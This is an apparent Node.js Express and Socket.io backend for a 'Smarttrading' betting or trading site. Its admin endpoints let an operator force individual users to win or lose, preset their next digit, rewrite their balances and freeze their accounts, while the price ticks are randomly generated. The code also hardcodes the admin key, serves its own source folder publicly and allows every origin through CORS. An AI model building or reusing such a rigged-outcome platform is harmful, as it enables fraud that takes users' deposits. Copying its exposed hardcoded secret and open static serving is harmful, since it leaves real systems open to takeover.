const express = require('express');
const http = require('http');
const path = require('path');
const mongoose = require('mongoose');
const cors = require('cors');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

// Middleware
app.use(express.json());
app.use(cors());

// Serve static assets directly from the root folder
app.use(express.static(__dirname));

// Explicit Route for Main Dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Database Schemas
const userSchema = new mongoose.Schema({
  username: String,
  liveBalance: { type: Number, default: 0 },
  demoBalance: { type: Number, default: 10000 },
  isFrozen: { type: Boolean, default: false },
  adminControls: {
    forceOutcome: { type: String, enum: ['NORMAL', 'WIN', 'LOSS'], default: 'NORMAL' },
    forcedNextDigit: { type: Number, default: null }
  }
});

const systemConfigSchema = new mongoose.Schema({
  evenOddPayout: { type: Number, default: 95.2 },
  maintenanceMode: { type: Boolean, default: false }
});

const User = mongoose.model('User', userSchema);
const SystemConfig = mongoose.model('SystemConfig', systemConfigSchema);

// Admin Middleware Protection
const verifyAdminKey = (req, res, next) => {
  const adminKey = req.headers['x-admin-key'];
  if (adminKey === 'SECRET_ADMIN_KEY_123') {
    next();
  } else {
    res.status(403).json({ success: false, message: 'Unauthorized: Invalid Admin Key' });
  }
};

// Admin Endpoints
app.post('/api/admin/manipulate-user', verifyAdminKey, async (req, res) => {
  const { userId, forceOutcome, forcedNextDigit } = req.body;
  try {
    const user = await User.findByIdAndUpdate(userId, {
      'adminControls.forceOutcome': forceOutcome,
      'adminControls.forcedNextDigit': forcedNextDigit !== '' ? Number(forcedNextDigit) : null
    }, { new: true });
    res.json({ success: true, user });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

app.post('/api/admin/update-wallet', verifyAdminKey, async (req, res) => {
  const { userId, liveBalance, demoBalance, isFrozen } = req.body;
  try {
    const user = await User.findByIdAndUpdate(userId, {
      liveBalance,
      demoBalance,
      isFrozen
    }, { new: true });
    res.json({ success: true, user });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

app.post('/api/admin/global-config', verifyAdminKey, async (req, res) => {
  const { evenOddPayout, maintenanceMode } = req.body;
  try {
    const config = await SystemConfig.findOneAndUpdate(
      {},
      { evenOddPayout, maintenanceMode },
      { upsert: true, new: true }
    );
    io.emit('SYSTEM_CONFIG_UPDATED', config);
    res.json({ success: true, config });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Real-time Synthetic Tick Stream via Socket.io
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  const tickInterval = setInterval(() => {
    const price = (1440 + Math.random() * 5).toFixed(2);
    const lastDigit = Math.floor(Math.random() * 10);
    socket.emit('TICK_UPDATE', { price, lastDigit, timestamp: Date.now() });
  }, 1000);

  socket.on('disconnect', () => clearInterval(tickInterval));
});

// Fallback for SPA Routing
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Server Initialization
const PORT = process.env.PORT || 10000;
const MONGO_URI = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/smarttrading';

mongoose.connect(MONGO_URI)
  .then(() => console.log('Connected to MongoDB successfully.'))
  .catch(() => console.log('MongoDB Warning: Database connection offline. Config values will use defaults.'));

server.listen(PORT, () => console.log(`Smarttrading Server running on port ${PORT}`));
